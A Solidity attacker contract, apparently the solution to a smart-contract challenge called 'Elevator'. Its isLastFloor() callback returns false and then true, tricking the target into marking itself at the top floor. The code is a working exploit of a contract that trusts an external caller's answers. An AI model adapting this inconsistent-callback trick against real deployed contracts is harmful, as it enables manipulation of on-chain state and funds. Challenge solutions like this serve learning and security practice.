// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Elevator {
    function goTo(uint) external;

    function top() external view returns (bool);
}

interface Building {
    function isLastFloor(uint) external returns (bool);
}

//make @top === true
contract EvilGator {
    //make function that evaluates false and then true
    bool flag = true;
    Elevator target;

    constructor(address _targetAddress) {
        target = Elevator(_targetAddress);
    }

    function isLastFloor(uint) external returns (bool) {
        if (flag == true) {
            flag = false;
            return false;
        } else {
            flag = true;
            return true;
        }
    }

    function rideElevator(uint _floor) public returns (bool) {
        target.goTo(_floor);
        bool top = isTop();
        require(top == true, "Didnt reach the top :L(");
        return top;
    }

    function isTop() internal view returns (bool) {
        return target.top();
    }
}
